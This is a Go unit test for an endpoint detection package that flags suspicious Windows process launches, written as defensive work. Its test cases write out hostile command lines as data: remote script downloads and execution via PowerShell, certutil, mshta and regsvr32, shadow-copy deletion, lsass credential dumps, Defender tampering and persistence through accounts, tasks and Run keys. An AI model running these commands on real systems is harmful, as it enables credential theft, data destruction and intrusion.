package detect

import (
	"strings"
	"testing"
)

// Each detection fires on what it is written for and stays quiet on the
// honest work that looks most like it.
func TestDetections(t *testing.T) {
	ps := `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`
	cases := []struct {
		what string
		e    Event
		want string // the detections that fire, in order, or ""
	}{
		{"Word starts PowerShell", Event{Name: "powershell.exe", Path: ps, By: "WINWORD.EXE", Command: `powershell -nop -c "Get-Date"`}, "office-starts-shell"},
		{"Excel starts the command prompt", Event{Name: "cmd.exe", By: "excel.exe", Command: `cmd /c echo hi`}, "office-starts-shell"},
		{"Explorer starts PowerShell", Event{Name: "powershell.exe", By: "explorer.exe", Command: `powershell`}, ""},
		{"Word starts Edge for a link", Event{Name: "msedge.exe", By: "winword.exe", Command: `msedge.exe https://example.com`}, ""},

		{"an encoded command", Event{Name: "powershell.exe", Command: `powershell.exe -NoP -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA`}, "powershell-encoded"},
		{"an ordinary script", Event{Name: "powershell.exe", Command: `powershell.exe -ExecutionPolicy Bypass -File C:\scripts\backup.ps1`}, ""},

		{"certutil fetches a file", Event{Name: "certutil.exe", Command: `certutil.exe -urlcache -split -f http://203.0.113.5/a.exe a.exe`}, "tool-downloads"},
		{"bitsadmin fetches a file", Event{Name: "bitsadmin.exe", Command: `bitsadmin /transfer job https://example.com/x.exe C:\x.exe`}, "tool-downloads"},
		{"PowerShell fetches a script", Event{Name: "powershell.exe", Command: `powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.5/s.ps1')"`}, "tool-downloads"},
		{"PowerShell reads a local file", Event{Name: "powershell.exe", Command: `powershell -c "Get-Content C:\logs\a.txt"`}, ""},
		{"certutil lists certificates", Event{Name: "certutil.exe", Command: `certutil -store my`}, ""},

		{"certutil decodes a file", Event{Name: "certutil.exe", Command: `certutil -decode payload.txt payload.exe`}, "certutil-decode"},
		{"mshta runs a page from the internet", Event{Name: "mshta.exe", Command: `mshta https://203.0.113.5/x.hta`}, "mshta-remote"},
		{"mshta runs a script on its line", Event{Name: "mshta.exe", Command: `mshta vbscript:Execute("CreateObject(""WScript.Shell"").Run ""calc"":close")`}, "mshta-remote"},
		{"regsvr32 runs a scriptlet", Event{Name: "regsvr32.exe", Command: `regsvr32 /s /n /u /i:http://203.0.113.5/x.sct scrobj.dll`}, "regsvr32-scriptlet"},
		{"regsvr32 registers a library", Event{Name: "regsvr32.exe", Command: `regsvr32 /s C:\Program Files\Tool\tool.dll`}, ""},
		{"rundll32 runs a script", Event{Name: "rundll32.exe", Command: `rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";alert(1)`}, "rundll32-script"},
		{"rundll32 opens the printer settings", Event{Name: "rundll32.exe", Command: `rundll32.exe printui.dll,PrintUIEntry /il`}, ""},

		{"shadow copies are deleted", Event{Name: "vssadmin.exe", Command: `vssadmin.exe Delete Shadows /All /Quiet`}, "backups-deleted"},
		{"shadow copies through wmic", Event{Name: "WMIC.exe", Command: `wmic shadowcopy delete`}, "backups-deleted"},
		{"recovery is switched off", Event{Name: "bcdedit.exe", Command: `bcdedit /set {default} recoveryenabled No`}, "backups-deleted"},
		{"the backup catalogue is deleted", Event{Name: "wbadmin.exe", Command: `wbadmin delete catalog -quiet`}, "backups-deleted"},
		{"shadow copies are listed", Event{Name: "vssadmin.exe", Command: `vssadmin list shadows`}, ""},

		{"an account is added", Event{Name: "net.exe", Command: `net user helpdesk P4ssw0rd! /add`}, "account-created"},
		{"an account is made an administrator", Event{Name: "net1.exe", Command: `net1 localgroup administrators helpdesk /add`}, "account-created"},
		{"accounts are listed", Event{Name: "net.exe", Command: `net user`}, ""},

		{"a task is made", Event{Name: "schtasks.exe", Command: `schtasks /create /tn Updater /tr C:\x.exe /sc onlogon`}, "task-created"},
		{"tasks are listed", Event{Name: "schtasks.exe", Command: `schtasks /query`}, ""},
		{"a Run line is added", Event{Name: "reg.exe", Command: `reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v X /d C:\x.exe`}, "run-key-added"},
		{"a Run line is read", Event{Name: "reg.exe", Command: `reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run`}, ""},

		{"Defender is told to skip a folder", Event{Name: "powershell.exe", Command: `powershell Add-MpPreference -ExclusionPath C:\Users\sam\AppData`}, "defender-changed"},
		{"Defender's real-time protection is switched off", Event{Name: "powershell.exe", Command: `powershell Set-MpPreference -DisableRealtimeMonitoring $true`}, "defender-changed"},
		{"Defender's settings are read", Event{Name: "powershell.exe", Command: `powershell Get-MpPreference`}, ""},

		{"lsass is dumped with ProcDump", Event{Name: "procdump64.exe", Command: `procdump64.exe -accepteula -ma lsass.exe out.dmp`}, "lsass-dump"},
		{"lsass is dumped with comsvcs", Event{Name: "rundll32.exe", Command: `rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 712 C:\lsass.dmp full`}, "lsass-dump"},
		{"wmic starts a program", Event{Name: "wmic.exe", Command: `wmic process call create "cmd.exe /c whoami"`}, "wmic-process"},
		{"wmic lists programs", Event{Name: "wmic.exe", Command: `wmic process list brief`}, ""},

		{"a program starts from Downloads", Event{Name: "setup.exe", Path: `C:\Users\sam\Downloads\setup.exe`}, "started-from-downloads"},
		{"a program starts from Program Files", Event{Name: "notes.exe", Path: `C:\Program Files\Notes\notes.exe`}, ""},
	}
	fired := map[string]bool{}
	for _, c := range cases {
		var got []string
		for _, a := range Check(c.e) {
			got = append(got, a.ID)
			fired[a.ID] = true
		}
		if strings.Join(got, " ") != c.want {
			t.Errorf("%s: got %q, want %q", c.what, strings.Join(got, " "), c.want)
		}
	}
	for _, d := range All {
		if !fired[d.ID] {
			t.Errorf("no test makes %s fire", d.ID)
		}
		if d.Title == "" || d.Why == "" || len(d.Attack) == 0 {
			t.Errorf("%s is missing its title, its reason or its technique", d.ID)
		}
		for _, id := range d.Attack {
			if Techniques[id] == "" {
				t.Errorf("%s names %s, which has no name in the list", d.ID, id)
			}
		}
		text := strings.NewReplacer("antivirus", "").Replace(strings.ToLower(d.Title + d.Why))
		if strings.Contains(text, "virus") || strings.Contains(text, "infected") {
			t.Errorf("%s calls something a virus", d.ID)
		}
	}
}
